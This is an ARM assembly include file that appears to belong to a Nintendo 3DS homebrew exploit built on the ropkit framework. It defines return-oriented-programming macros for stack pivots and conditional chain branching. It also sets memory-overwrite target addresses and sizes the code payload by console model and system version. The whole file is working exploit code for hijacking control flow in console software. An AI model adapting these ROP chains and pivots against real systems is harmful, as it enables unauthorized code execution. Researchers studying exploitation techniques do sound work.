#include "ropkit_ropinclude.s"

#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12-0x14

#define ROP_BXR1 POP_R4LR_BXR1+4
#define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"

#if NEW3DS==0
	#define NSS_PROCLOADTEXT_LINEARMEMADR 0x36500000
#else
	#define NSS_PROCLOADTEXT_LINEARMEMADR ((0x3d900000-0x400000)+0x21b000)//In SKATER, overwrite the code which gets called for assert/svcBreak when allocating the main heap fails.
#endif

#ifndef LOADSDPAYLOAD
	#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
#else
	#if NEW3DS==0
		#define CODEBINPAYLOAD_SIZE 0x4000
	#else
		#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
			#define CODEBINPAYLOAD_SIZE 0x4000
		#else
			#define CODEBINPAYLOAD_SIZE 0x6000
		#endif
	#endif
#endif

#define NEWTHREAD_ROPBUFFER 0x0ff00000

#define MAINLR_SVCEXITPROCESS 0x00100020 //LR of main(), svcExitProcess.

.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
.word POP_R2R6PC
.word 0 @ r2
.word 0 @ r3
.word ROPBUF + ((object + 0x20) - _start) @ r4
.word 0 @ r5
.word 0 @ r6
.endm

.macro ROPMACRO_STACKPIVOT_JUMP
.word STACKPIVOT_ADR
.endm

.macro ROPMACRO_STACKPIVOT_NEWTHREAD sp, pc
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \sp @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \pc @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0

.word ROP_LOADR4_FROMOBJR0
.endm

.macro ROPMACRO_CMPDATA_NEWTHREAD cmpaddr, cmpword, stackaddr_cmpmismatch
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + ((. + 0x14) - newthread_ropstart) @ r0

.word POP_R1PC
.word \cmpaddr @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *cmpaddr to ROPMACRO_CMPDATA_cmpword.

.word POP_R0PC
//ROPMACRO_CMPDATA_cmpword:
.word 0 @ r0

.word POP_R1PC
.word \cmpword @ r1

.word ROP_CMPR0R1

.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart) @ r0

.word POP_R1PC
.word \stackaddr_cmpmismatch @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise do the above stack-pivot.

.word 0, 0, 0 @ r4..r6
.endm

